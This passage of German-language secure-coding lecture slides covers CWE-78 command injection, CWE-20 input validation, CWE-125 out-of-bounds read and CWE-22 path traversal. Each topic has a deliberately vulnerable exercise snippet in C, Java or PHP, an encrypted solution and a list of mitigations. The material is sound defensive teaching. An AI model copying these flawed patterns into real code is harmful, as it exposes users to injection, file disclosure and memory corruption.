EHku8+lARnm7BZLr73HJU0Os7/R/Corezx8AQkvjV70Hdd6KrB8UTyTeb6nDse5T9IxUQYEhm9hOM+EeywwkkdRBev1wnD/Igz1+//G21fDHbr3lHerIFWGoihj5B3q/SER+tULXJf3wroRbIv3ajB9Yj0gJ0TnsLD/w/Zg7LpXtPRWOafrrC/Pql1CuA8MBgBbFs3pHG4b+07VGp4vVv0r6xFX5oB5/dgzwVu807KY4aw/p1ONL</div>
</div>
</ld-card><ld-card class="incremental">
<div class="ld-exercise" data-exercise-id="12" data-exercise-title="12 - CVE-2006-4997 IP over ATM clip_mkip dereference freed pointer (Linux Kernel)" id="ld-exercise-12">
<p class="ld-exercise-title rubric">CVE-2006-4997 IP over ATM clip_mkip dereference freed pointer (Linux Kernel)</p>
<pre class="code c literal-block"><code><span class="comment single">// clip_mkip (clip.c):
</span><span class="whitespace">    </span><span class="literal number integer">198</span><span class="whitespace"> </span><span class="keyword">static</span><span class="whitespace"> </span><span class="keyword type">void</span><span class="whitespace"> </span><span class="name">clip_push</span><span class="punctuation">(</span><span class="keyword">struct</span><span class="whitespace"> </span><span class="name class">atm_vcc</span><span class="whitespace"> </span><span class="operator">*</span><span class="name">vcc</span><span class="punctuation">,</span><span class="keyword">struct</span><span class="whitespace"> </span><span class="name class">sk_buff</span><span class="whitespace"> </span><span class="operator">*</span><span class="name">skb</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace">
    </span><span class="punctuation">...</span><span class="whitespace">
    </span><span class="literal number integer">234</span><span class="whitespace">         </span><span class="name">memset</span><span class="punctuation">(</span><span class="name">ATM_SKB</span><span class="punctuation">(</span><span class="name">skb</span><span class="punctuation">),</span><span class="whitespace"> </span><span class="literal number integer">0</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="keyword">sizeof</span><span class="punctuation">(</span><span class="keyword">struct</span><span class="whitespace"> </span><span class="name class">atm_skb_data</span><span class="punctuation">));</span><span class="whitespace">
    </span><span class="literal number integer">235</span><span class="whitespace">         </span><span class="name">netif_rx</span><span class="punctuation">(</span><span class="name">skb</span><span class="punctuation">);</span><span class="whitespace">
    </span><span class="literal number integer">236</span><span class="whitespace"> </span><span class="punctuation">}</span><span class="whitespace">
    </span><span class="punctuation">...</span><span class="whitespace">         </span><span class="comment single">// PROBLEMATIC CODE STARTS HERE:
</span><span class="whitespace">    </span><span class="literal number integer">510</span><span class="whitespace">         </span><span class="name">clip_push</span><span class="punctuation">(</span><span class="name">vcc</span><span class="punctuation">,</span><span class="name">skb</span><span class="punctuation">);</span><span class="whitespace">
    </span><span class="literal number integer">511</span><span class="whitespace">         </span><span class="name">PRIV</span><span class="punctuation">(</span><span class="name">skb</span><span class="operator">-&gt;</span><span class="name">dev</span><span class="punctuation">)</span><span class="operator">-&gt;</span><span class="name">stats</span><span class="punctuation">.</span><span class="name">rx_packets</span><span class="operator">--</span><span class="punctuation">;</span><span class="whitespace">
    </span><span class="literal number integer">512</span><span class="whitespace">         </span><span class="name">PRIV</span><span class="punctuation">(</span><span class="name">skb</span><span class="operator">-&gt;</span><span class="name">dev</span><span class="punctuation">)</span><span class="operator">-&gt;</span><span class="name">stats</span><span class="punctuation">.</span><span class="name">rx_bytes</span><span class="whitespace"> </span><span class="operator">-=</span><span class="whitespace"> </span><span class="name">len</span><span class="punctuation">;</span><span class="whitespace">

</span><span class="comment single">// netif_rx (dev.c):
</span><span class="whitespace">    </span><span class="literal number integer">1392</span><span class="whitespace"> </span><span class="keyword type">int</span><span class="whitespace"> </span><span class="name">netif_rx</span><span class="punctuation">(</span><span class="keyword">struct</span><span class="whitespace"> </span><span class="name class">sk_buff</span><span class="whitespace"> </span><span class="operator">*</span><span class="name">skb</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace">
    </span><span class="punctuation">...</span><span class="whitespace">
    </span><span class="literal number integer">1428</span><span class="whitespace">        </span><span class="name">kfree_skb</span><span class="punctuation">(</span><span class="name">skb</span><span class="punctuation">);</span><span class="whitespace">     </span><span class="comment single">//drop skb
</span><span class="whitespace">    </span><span class="literal number integer">1429</span><span class="whitespace">        </span><span class="keyword">return</span><span class="whitespace"> </span><span class="name">NET_RX_DROP</span><span class="punctuation">;</span></code></pre>
<div class="ld-exercise-solution" data-encrypted="true">
MTAwMDAw:9Io5tNCChE1xvmq1MD/er1rg0PLo3BPNs/XfIeDBO5c=:ZpRYSCkGBqJ56GIL:VRtqalb9gKoA030GUxlOpnAmzYLosRKJIo4XXp9NrOY8d6rh8rTqYG56/HH78cPNGTw9xmswjLdE9fvKbuRVXw59Cp03NRZAYTW29aeahLIOcX5/bjctTgC7f8SBgZhDJ47v56AE3FHmgtom4NuekU600/QB03JUiwPiQQStbnPuyaNrYuwjMKDtBABJRjH61UqJbHuNYiMv0+GqSkeX4pkoiXTJGqm6T2GDstXJRMX7IxmMFkY6Z6MqBfvbTtFAa+heNqgca0FmTtv8BsQUYvalayA=</div>
</div>
</ld-card><ld-card class="incremental">
<p class="rubric">Abhilfemaßnahmen und Erkennung</p>
<ul class="incremental-list simple">
<li><p>Wahl einer sicheren Programmiersprache (z. B. RUST)</p></li>
<li><p>explizites <code>NULL</code> setzen, nachdem der Speicherbereich freigegeben wurde</p></li>
<li><p>Fuzzing</p></li>
<li><p>Statische Analyse Werkzeuge</p></li>
</ul>
<div class="supplemental docutils container">
<p>Empfohlene Lektüre: <a class="reference external" href="https://github.blog/2021-03-24-real-world-exploit-chains-explained/">One day short of a full chain: Real world exploit chains explained</a> (In Teil 1 wird eine UAF Schwachstelle genutzt.)</p>
</div>
</ld-card></ld-deck></ld-topic>
<ld-topic class="new-subsection transition-move-to-top" id="cwe-78-improper-neutralization-of-special-elements-used-in-an-os-command-os-command-injection">
<h2>CWE-78: Improper Neutralization of Special Elements used in an OS Command (<em>OS Command Injection</em>)</h2>
<div class="section-subtitle docutils container">
<p class="rubric">CWE Rank</p>
<table class="booktabs table-data-align-left table-header-align-left" style="width: 100%;">
<colgroup>
<col style="width: 40.0%" />
<col style="width: 60.0%" />
</colgroup>
<thead>
<tr><th class="head"><p>Jahr</p></th>
<th class="head"><p>Position</p></th>
</tr>
</thead>
<tbody>
<tr><td><p>2024</p></td>
<td><p>#7</p></td>
</tr>
<tr><td><p>2023</p></td>
<td><p>#5</p></td>
</tr>
</tbody>
</table>
</div>
</ld-topic>
<ld-topic id="cwe-78-os-command-injection">
<h2>CWE-78: <em>OS Command Injection</em></h2>
<ld-deck>
<ld-card>
<dl class="field-list simple">
<dt>Kurzbeschreibung<span class="colon">:</span></dt>
<dd><p>Alles oder zumindest ein Teil eines Betriebssystembefehls hängt von extern beeinflussten Eingaben ab. Es erfolgt jedoch keine Bereinigung spezieller Elemente, die den beabsichtigten Betriebssystembefehl verändern könnten.</p>
</dd>
</dl>
<dl class="field-list simple">
<dt>Wahrscheinlichkeit des Missbrauchs<span class="colon">:</span></dt>
<dd><p>Hoch</p>
</dd>
<dt>Betrifft<span class="colon">:</span></dt>
<dd><p>Verfügbarkeit, Vertraulichkeit, Integrität</p>
</dd>
<dt>Arten<span class="colon">:</span></dt>
<dd><ol class="arabic simple">
<li><p>Ein bestimmtes Program wird ausgeführt und die Nutzerdaten werden als Parameter übergeben.</p></li>
<li><p>Die Anwendung bestimmt basierend auf den Nutzerdaten welches Program mit welchen Parametern ausgeführt wird.</p></li>
</ol>
</dd>
</dl>
</ld-card><ld-card class="incremental">
<div class="ld-exercise" data-exercise-id="13" data-exercise-title="13 - OS Command Injection in Java" id="ld-exercise-13">
<p class="ld-exercise-title rubric">OS Command Injection in Java</p>
<pre class="code java literal-block"><small class="ln"> 1 </small><code data-lineno=" 1 "><span class="punctuation">...</span><span class="whitespace">
</span></code><small class="ln"> 2 </small><code data-lineno=" 2 "><span class="whitespace"></span><span class="name">String</span><span class="whitespace"> </span><span class="name">btype</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">request</span><span class="punctuation">.</span><span class="name attribute">getParameter</span><span class="punctuation">(</span><span class="literal string">&quot;backuptype&quot;</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln"> 3 </small><code data-lineno=" 3 "><span class="whitespace"></span><span class="name">String</span><span class="whitespace"> </span><span class="name">cmd</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="keyword">new</span><span class="whitespace"> </span><span class="name">String</span><span class="punctuation">(</span><span class="whitespace">
</span></code><small class="ln"> 4 </small><code data-lineno=" 4 "><span class="whitespace">    </span><span class="literal string">&quot;cmd.exe /K \&quot;c:\\util\\rmanDB.bat &quot;</span><span class="whitespace">
</span></code><small class="ln"> 5 </small><code data-lineno=" 5 "><span class="whitespace">    </span><span class="operator">+</span><span class="whitespace"> </span><span class="name">btype</span><span class="whitespace"> </span><span class="operator">+</span><span class="whitespace">
</span></code><small class="ln"> 6 </small><code data-lineno=" 6 "><span class="whitespace">    </span><span class="literal string">&quot;&amp;&amp;c:\\utl\\cleanup.bat\&quot;&quot;</span><span class="punctuation">)</span><span class="whitespace">
</span></code><small class="ln"> 7 </small><code data-lineno=" 7 "><span class="whitespace">
</span></code><small class="ln"> 8 </small><code data-lineno=" 8 "><span class="whitespace"></span><span class="name">System</span><span class="punctuation">.</span><span class="name attribute">Runtime</span><span class="punctuation">.</span><span class="name attribute">getRuntime</span><span class="punctuation">().</span><span class="name attribute">exec</span><span class="punctuation">(</span><span class="name">cmd</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln"> 9 </small><code data-lineno=" 9 "><span class="whitespace"></span><span class="punctuation">...</span></code></pre>
<div class="ld-exercise-solution" data-encrypted="true">
MTAwMDAw:dB66B8Rw/9wlpG9y44R3M+rGyWteJa3ybFHepsSNu1w=:m56mm0hrJSZFdZ+5:SocAdosO2qKiWZAICQmYmBsAHRFkrM8c6Immx/7T+mi+zoZGfXhVwbPpBPIaKxFU8IvBPreaDkAvVqDhdYXv87wIrGAzVmb28Mi9fwLWXCqUGDocJ4aeY/yzY5oNQP58lIZzJ8cEJo7RaR3U8MdHv/65XoJQRVLvqa/aH1f3kc9VbJTQxaMxTLGPfQEZBUXX/DMs/6dtPVe9kwegbOP/4lacu0QLBvDwzYXa00eyNFupnFk9cPcyrlV/DYJ7nk51V6BeuhpyOKMTYaRaDihZyw9rdZudjka3OWRPPmuehzmRLMmtDMLGmtRfCdaSylCigNnTOGTkz/7RQuha23dkFojn6gHGtb3RG+s=</div>
</div>
</ld-card><ld-card class="incremental">
<p class="rubric">Abhilfemaßnahmen und Erkennung</p>
<ul class="incremental-list simple">
<li><p>Verwendung von geprüften/sicheren APIs.</p></li>
<li><p>Anwendung bzw. Befehl nur mit den notwendigen Rechten betreiben (<em>Principle of Least Privilege</em>) bzw. in einer Sandbox ausführen.</p></li>
<li><p>Statische Analyse Werkzeuge</p></li>
<li><p>Dynammische Analyse in Kombination mit Fuzzing</p></li>
<li><p>Manuelle Code Reviews/Statische Analyse</p></li>
<li><p>ggf. Application-level Firewall einsetzen</p></li>
</ul>
</ld-card></ld-deck></ld-topic>
<ld-topic class="new-subsection transition-move-to-top" id="cwe-20-improper-input-validation">
<h2>CWE-20: Improper Input Validation</h2>
<div class="section-subtitle docutils container">
<p class="rubric">CWE Rank</p>
<table class="booktabs table-data-align-left table-header-align-left" style="width: 100%;">
<colgroup>
<col style="width: 40.0%" />
<col style="width: 60.0%" />
</colgroup>
<thead>
<tr><th class="head"><p>Jahr</p></th>
<th class="head"><p>Position</p></th>
</tr>
</thead>
<tbody>
<tr><td><p>2024</p></td>
<td><p>#12</p></td>
</tr>
<tr><td><p>2023</p></td>
<td><p>#6</p></td>
</tr>
</tbody>
</table>
</div>
</ld-topic>
<ld-topic id="cwe-20-improper-input-validation-1">
<h2>CWE-20: Improper Input Validation</h2>
<ld-deck>
<ld-card>
<dl class="field-list simple">
<dt>Kurzbeschreibung<span class="colon">:</span></dt>
<dd><p>Empfangene Eingaben oder Daten werden nicht nicht oder falsch validiert in Hinblick darauf, dass die Eingaben die Eigenschaften haben, die für eine sichere und korrekte Verarbeitung der Daten erforderlich sind.</p>
</dd>
</dl>
<dl class="field-list simple">
<dt>Wahrscheinlichkeit des Missbrauchs<span class="colon">:</span></dt>
<dd><p>Hoch</p>
</dd>
<dt>Betrifft<span class="colon">:</span></dt>
<dd><p>Verfügbarkeit, Vertraulichkeit, Integrität</p>
</dd>
<dt>Anwendungsbereiche<span class="colon">:</span></dt>
<dd><ul class="simple">
<li><p>Rohdaten - Strings, Zahlen, Parameter, Dateiinhalte, etc.</p></li>
<li><p>Metadaten - Information über die Rohdaten, wie zum Beispiel <em>Header</em> oder Größe</p></li>
</ul>
</dd>
</dl>
</ld-card><ld-card class="incremental">
<p class="rubric">Zu verifizierende Werte und Eigenschaften</p>
<dl class="incremental-list dd-margin-left-6em field-list simple">
<dt>Größen<span class="colon">:</span></dt>
<dd><p>Z. B. Länge, Häufigkeit, Preis, Rate, Anzahl der Vorgänge, Zeit usw.</p>
</dd>
<dt>Implizite oder abgeleitete Größen<span class="colon">:</span></dt>
<dd><p>Z. B. die tatsächliche Größe einer Datei anstelle einer angegebenen Größe.</p>
</dd>
<dt>Indizes*<span class="colon">:</span></dt>
<dd><p>Offsets oder Positionen in komplexeren Datenstrukturen.</p>
</dd>
<dt>Schlüssel<span class="colon">:</span></dt>
<dd><p>Z. B. von Hashtabellen oder assoziativen Feldern.</p>
</dd>
<dt>Syntaktische Korrektheit<span class="colon">:</span></dt>
<dd><p>Übereinstimmung mit der erwarteten Syntax.</p>
</dd>
<dt>Konsistenz<span class="colon">:</span></dt>
<dd><p>Z. B. zwischen den Rohdaten und Metadaten oder zwischen Referenzen.</p>
</dd>
<dt>Semantische Korrektheit<span class="colon">:</span></dt>
<dd><p>Z. B. Konformität mit domänenspezifischen Regeln, z. B. Geschäftslogik.</p>
</dd>
<dt>Authentizität<span class="colon">:</span></dt>
<dd><p>Z. B. von kryptografischen Signaturen.</p>
</dd>
</dl>
</ld-card><ld-card class="incremental">
<p class="rubric">O'Reilly ist keine SQL Injection</p>
<aside class="admonition observation">
<p class="admonition-title">Beobachtung</p>
<p>Ein Name wie <span class="docutils literal">O'Reily</span> stellt ein Problem dar, wenn er in ein SQL Statement eingefügt wird, sollte jedoch von der Anwendung verarbeitet werden können und die Eingabevalidierung passieren.</p>
</aside>
<aside class="admonition incremental hint">
<p class="admonition-title">Hinweis</p>
<p>Die Validierung muss immer in Hinblick auf den Kontext erfolgen.</p>
</aside>
</ld-card><ld-card class="incremental">
<div class="ld-exercise" data-exercise-id="14" data-exercise-title="14 - Partielle Validierung in C" id="ld-exercise-14">
<p class="ld-exercise-title rubric">Partielle Validierung in C</p>
<pre class="code c literal-block"><small class="ln"> 1 </small><code data-lineno=" 1 "><span class="comment preproc">#define MAX_DIM 100
</span></code><small class="ln"> 2 </small><code data-lineno=" 2 "><span class="comment preproc"></span><span class="keyword type">int</span><span class="whitespace"> </span><span class="name">m</span><span class="punctuation">,</span><span class="name">n</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="name">error</span><span class="punctuation">;</span><span class="whitespace"> </span><span class="comment multiline">/* m,n = board dimensions */</span><span class="whitespace">
</span></code><small class="ln"> 3 </small><code data-lineno=" 3 "><span class="whitespace"></span><span class="name">board_square_t</span><span class="whitespace"> </span><span class="operator">*</span><span class="name">board</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln"> 4 </small><code data-lineno=" 4 "><span class="whitespace"></span><span class="name">printf</span><span class="punctuation">(</span><span class="literal string">&quot;Please specify the board height: </span><span class="literal string escape">\n</span><span class="literal string">&quot;</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln"> 5 </small><code data-lineno=" 5 "><span class="whitespace"></span><span class="name">error</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">scanf</span><span class="punctuation">(</span><span class="literal string">&quot;%d&quot;</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="operator">&amp;</span><span class="name">m</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln"> 6 </small><code data-lineno=" 6 "><span class="whitespace"></span><span class="keyword">if</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="whitespace"> </span><span class="name">EOF</span><span class="whitespace"> </span><span class="operator">==</span><span class="whitespace"> </span><span class="name">error</span><span class="whitespace"> </span><span class="punctuation">)</span><span class="whitespace"> </span><span class="name">die</span><span class="punctuation">(</span><span class="literal string">&quot;No integer passed!</span><span class="literal string escape">\n</span><span class="literal string">&quot;</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln"> 7 </small><code data-lineno=" 7 "><span class="whitespace"></span><span class="name">printf</span><span class="punctuation">(</span><span class="literal string">&quot;Please specify the board width: </span><span class="literal string escape">\n</span><span class="literal string">&quot;</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln"> 8 </small><code data-lineno=" 8 "><span class="whitespace"></span><span class="name">error</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">scanf</span><span class="punctuation">(</span><span class="literal string">&quot;%d&quot;</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="operator">&amp;</span><span class="name">n</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln"> 9 </small><code data-lineno=" 9 "><span class="whitespace"></span><span class="keyword">if</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="whitespace"> </span><span class="name">EOF</span><span class="whitespace"> </span><span class="operator">==</span><span class="whitespace"> </span><span class="name">error</span><span class="whitespace"> </span><span class="punctuation">)</span><span class="whitespace"> </span><span class="name">die</span><span class="punctuation">(</span><span class="literal string">&quot;No integer passed!</span><span class="literal string escape">\n</span><span class="literal string">&quot;</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln">10 </small><code data-lineno="10 "><span class="whitespace"></span><span class="keyword">if</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="whitespace"> </span><span class="name">m</span><span class="whitespace"> </span><span class="operator">&gt;</span><span class="whitespace"> </span><span class="name">MAX_DIM</span><span class="whitespace"> </span><span class="operator">||</span><span class="whitespace"> </span><span class="name">n</span><span class="whitespace"> </span><span class="operator">&gt;</span><span class="whitespace"> </span><span class="name">MAX_DIM</span><span class="whitespace"> </span><span class="punctuation">)</span><span class="whitespace"> </span><span class="name">die</span><span class="punctuation">(</span><span class="literal string">&quot;Value too large!</span><span class="literal string escape">\n</span><span class="literal string">&quot;</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln">11 </small><code data-lineno="11 "><span class="whitespace">
</span></code><small class="ln">12 </small><code data-lineno="12 "><span class="whitespace"></span><span class="name">board</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="name">board_square_t</span><span class="operator">*</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="name">malloc</span><span class="punctuation">(</span><span class="whitespace"> </span><span class="name">m</span><span class="whitespace"> </span><span class="operator">*</span><span class="whitespace"> </span><span class="name">n</span><span class="whitespace"> </span><span class="operator">*</span><span class="whitespace"> </span><span class="keyword">sizeof</span><span class="punctuation">(</span><span class="name">board_square_t</span><span class="punctuation">));</span><span class="whitespace">
</span></code><small class="ln">13 </small><code data-lineno="13 "><span class="whitespace"></span><span class="punctuation">...</span></code></pre>
<aside class="admonition incremental warning">
<p class="admonition-title">Warnung</p>
<p>Ein vergleichbares Problem ist auch in sicheren Programmiersprachen möglich.</p>
</aside>
<div class="ld-exercise-solution" data-encrypted="true">
MTAwMDAw:Wy7yqgY8agOHlHpgD418S3qvE0E8P6G7BJXwqg0kpHI=:rxGi8IzzlWYLqw9H:HUaKpgTZ65bdFvwA/ITq/PPK8I95SKgVsV3U5cRqJZeGWotbPVMpXPzDRq9JyyJDRwJT8Lw/Fs1sOjPwjtx0/ldwBbJADgKBzWwRCBW1HD0/s/jygQ5jZyCtbjsjEGCCSx94nTAliTZZcGlmkV//zhOGtcFJ+kQGkkYNwnvn4UnRR5pG/Eey27PNrJCiIOlLvOct3AXsDs7Ro/EGjgXJCgenJQ6jqYyI2YYPZ6pwT54VouXMVnGrfXCPE1A=</div>
</div>
</ld-card><ld-card class="incremental">
<p class="rubric">Abhilfemaßnahmen und Erkennung</p>
<ul class="incremental-list simple">
<li><p>(begrenzt) Statische Analyse Werkzeuge</p></li>
<li><p>Manuelle statische Analyse insbesondere in Hinblick auf die zugrundeliegende Semantik</p></li>
<li><p>Dynamische Analyse mit Fuzzing</p></li>
</ul>
</ld-card></ld-deck></ld-topic>
<ld-topic class="new-subsection transition-move-to-top" id="cwe-125-out-of-bounds-read">
<h2>CWE-125: Out-of-bounds Read</h2>
<div class="section-subtitle docutils container">
<p class="rubric">CWE Rank</p>
<table class="booktabs table-data-align-left table-header-align-left" style="width: 100%;">
<colgroup>
<col style="width: 40.0%" />
<col style="width: 60.0%" />
</colgroup>
<thead>
<tr><th class="head"><p>Jahr</p></th>
<th class="head"><p>Position</p></th>
</tr>
</thead>
<tbody>
<tr><td><p>2024</p></td>
<td><p>#6</p></td>
</tr>
<tr><td><p>2023</p></td>
<td><p>#7</p></td>
</tr>
</tbody>
</table>
</div>
</ld-topic>
<ld-topic id="cwe-125-out-of-bounds-read-1">
<h2>CWE-125: Out-of-bounds Read</h2>
<ld-deck>
<ld-card>
<dl class="field-list simple">
<dt>Kurzbeschreibung<span class="colon">:</span></dt>
<dd><p>Daten vor oder nach einem Puffer werden gelesen.</p>
</dd>
</dl>
<dl class="field-list simple">
<dt>Wahrscheinlichkeit des Missbrauchs<span class="colon">:</span></dt>
<dd><p>Hoch</p>
</dd>
<dt>Programmiersprachen<span class="colon">:</span></dt>
<dd><p>C, C++</p>
</dd>
<dt>Betrifft<span class="colon">:</span></dt>
<dd><p>Vertraulichkeit</p>
</dd>
<dt>Auswirkungen<span class="colon">:</span></dt>
<dd><p>Umgehung von Schutzmaßnahmen; Lesen von Speicher</p>
</dd>
</dl>
<div class="supplemental docutils container">
<p>Die Ausnutzung dieser Schwachstelle ist häufig schwierig, da nicht immer bekannt ist welche und wie viele Daten gelesen werden können. Es kann allerdings möglich sein Speicheradressen auszulesen. Dies kann ggf. genutzt werden, um Mechanismen wie ASLR zu umgehen.</p>
</div>
</ld-card><ld-card class="incremental">
<div class="ld-exercise" data-exercise-id="15" data-exercise-title="15 - Partielle Validierung in C" id="ld-exercise-15">
<p class="ld-exercise-title rubric">Partielle Validierung in C</p>
<pre class="code C literal-block"><small class="ln"> 1 </small><code data-lineno=" 1 "><span class="keyword type">int</span><span class="whitespace"> </span><span class="name function">getValueFromArray</span><span class="punctuation">(</span><span class="keyword type">int</span><span class="whitespace"> </span><span class="operator">*</span><span class="name">array</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="keyword type">int</span><span class="whitespace"> </span><span class="name">len</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="keyword type">int</span><span class="whitespace"> </span><span class="name">index</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace">
</span></code><small class="ln"> 2 </small><code data-lineno=" 2 "><span class="whitespace">    </span><span class="keyword type">int</span><span class="whitespace"> </span><span class="name">value</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln"> 3 </small><code data-lineno=" 3 "><span class="whitespace">
</span></code><small class="ln"> 4 </small><code data-lineno=" 4 "><span class="whitespace">    </span><span class="comment single">// check that the array index is less than the maximum length of the array
</span></code><small class="ln"> 5 </small><code data-lineno=" 5 "><span class="comment single"></span><span class="whitespace">    </span><span class="keyword">if</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="name">index</span><span class="whitespace"> </span><span class="operator">&lt;</span><span class="whitespace"> </span><span class="name">len</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace">
</span></code><small class="ln"> 6 </small><code data-lineno=" 6 "><span class="whitespace">        </span><span class="comment single">// get the value at the specified index of the array
</span></code><small class="ln"> 7 </small><code data-lineno=" 7 "><span class="comment single"></span><span class="whitespace">        </span><span class="name">value</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">array</span><span class="punctuation">[</span><span class="name">index</span><span class="punctuation">];</span><span class="whitespace">
</span></code><small class="ln"> 8 </small><code data-lineno=" 8 "><span class="whitespace">    </span><span class="punctuation">}</span><span class="whitespace">
</span></code><small class="ln"> 9 </small><code data-lineno=" 9 "><span class="whitespace">    </span><span class="comment single">// if array index is invalid then output error message
</span></code><small class="ln">10 </small><code data-lineno="10 "><span class="comment single"></span><span class="whitespace">    </span><span class="comment single">// and return value indicating error
</span></code><small class="ln">11 </small><code data-lineno="11 "><span class="comment single"></span><span class="whitespace">    </span><span class="keyword">else</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace">
</span></code><small class="ln">12 </small><code data-lineno="12 "><span class="whitespace">        </span><span class="name">printf</span><span class="punctuation">(</span><span class="literal string">&quot;Value is: %d</span><span class="literal string escape">\n</span><span class="literal string">&quot;</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="name">array</span><span class="punctuation">[</span><span class="name">index</span><span class="punctuation">]);</span><span class="whitespace">
</span></code><small class="ln">13 </small><code data-lineno="13 "><span class="whitespace">        </span><span class="name">value</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="literal number integer">-1</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln">14 </small><code data-lineno="14 "><span class="whitespace">    </span><span class="punctuation">}</span><span class="whitespace">
</span></code><small class="ln">15 </small><code data-lineno="15 "><span class="whitespace">    </span><span class="keyword">return</span><span class="whitespace"> </span><span class="name">value</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln">16 </small><code data-lineno="16 "><span class="whitespace"></span><span class="punctuation">}</span></code></pre>
<div class="ld-exercise-solution" data-encrypted="true">
MTAwMDAw:Y5OzHxEC70mrJFzVlzRrkRB2XEmDznVZLZHrO6Pac+8=:YctidRBQc3TSswrP:33qRYqej7CoB6BYQ17gM+yVjkGUC0HG0EXwJZgvNKNikuUeLeoyr1H0nb680CY50hMDKimG6o01nER8o8siUHCK0padRM5hMff4L+NFqQdQVsXTa679FP/bSrJKLVlBzHh+PJlQPS/5TNrIxj139pL7qt+v6OLjC/DzeR9rm5i1RJRo3ve/LExKNpE+qFdsGVVPvkmkt8XmclSGdJzg=</div>
</div>
</ld-card><ld-card class="incremental">
<p class="rubric">Abhilfemaßnahmen und Erkennung</p>
<ul class="incremental-list simple">
<li><p>eine sichere Programmiersprache verwenden</p></li>
<li><p>Fuzzing</p></li>
<li><p>Statische Analyse Werkzeuge welche Kontroll- und Datenflussanalyse durchführen</p></li>
</ul>
</ld-card></ld-deck></ld-topic>
<ld-topic class="new-subsection transition-move-to-top" id="cwe-22-improper-limitation-of-a-pathname-to-a-restricted-directory-path-traversal">
<h2>CWE-22: Improper Limitation of a Pathname to a Restricted Directory (<em>Path Traversal</em>)</h2>
<div class="section-subtitle docutils container">
<p class="rubric">CWE Rank</p>
<table class="booktabs table-data-align-left table-header-align-left" style="width: 100%;">
<colgroup>
<col style="width: 40.0%" />
<col style="width: 60.0%" />
</colgroup>
<thead>
<tr><th class="head"><p>Jahr</p></th>
<th class="head"><p>Position</p></th>
</tr>
</thead>
<tbody>
<tr><td><p>2024</p></td>
<td><p>#5</p></td>
</tr>
<tr><td><p>2023</p></td>
<td><p>#8</p></td>
</tr>
</tbody>
</table>
</div>
</ld-topic>
<ld-topic id="cwe-22-path-traversal">
<h2>CWE-22: <em>Path Traversal</em></h2>
<ld-deck>
<ld-card>
<dl class="field-list simple">
<dt>Kurzbeschreibung<span class="colon">:</span></dt>
<dd><p>Externe Eingaben werden für die Konstruktion eines Pfadnamens verwendet, der eine Datei oder ein Verzeichnis identifizieren soll, das sich unterhalb eines eingeschränkten übergeordneten Verzeichnisses befindet. Eine Bereinigung spezieller Elemente innerhalb des Pfadnamens erfolgt jedoch nicht ordnungsgemäß, was dazu führen kann, dass der Pfadname zu einem Ort außerhalb des eingeschränkten Verzeichnisses aufgelöst wird.</p>
</dd>
</dl>
<dl class="field-list simple">
<dt>Wahrscheinlichkeit des Missbrauchs<span class="colon">:</span></dt>
<dd><p>Hoch</p>
</dd>
<dt>Betrifft<span class="colon">:</span></dt>
<dd><p>Vertraulichkeit, Integrität, Verfügbarkeit</p>
</dd>
</dl>
</ld-card><ld-card class="incremental">
<div class="ld-exercise" data-exercise-id="16" data-exercise-title="16 - Path Traversal aufgrund fehlender Validierung" id="ld-exercise-16">
<p class="ld-exercise-title rubric"><em>Path Traversal</em> aufgrund fehlender Validierung</p>
<p><strong>PHP</strong></p>
<pre class="code php literal-block"><small class="ln">1 </small><code data-lineno="1 "><span class="comment preproc">&lt;?php</span>
</code><small class="ln">2 </small><code data-lineno="2 "><span class="name variable">$file</span> <span class="operator">=</span> <span class="name variable">$_GET</span><span class="punctuation">[</span><span class="literal string single">'file'</span><span class="punctuation">];</span>
</code><small class="ln">3 </small><code data-lineno="3 "><span class="keyword">include</span><span class="punctuation">(</span><span class="literal string double">&quot;/home/www-data/</span><span class="literal string interpol">$file</span><span class="literal string double">&quot;</span><span class="punctuation">);</span>
</code><small class="ln">4 </small><code data-lineno="4 "><span class="comment preproc">?&gt;</span></code></pre>
<div class="ld-exercise-solution" data-encrypted="true">
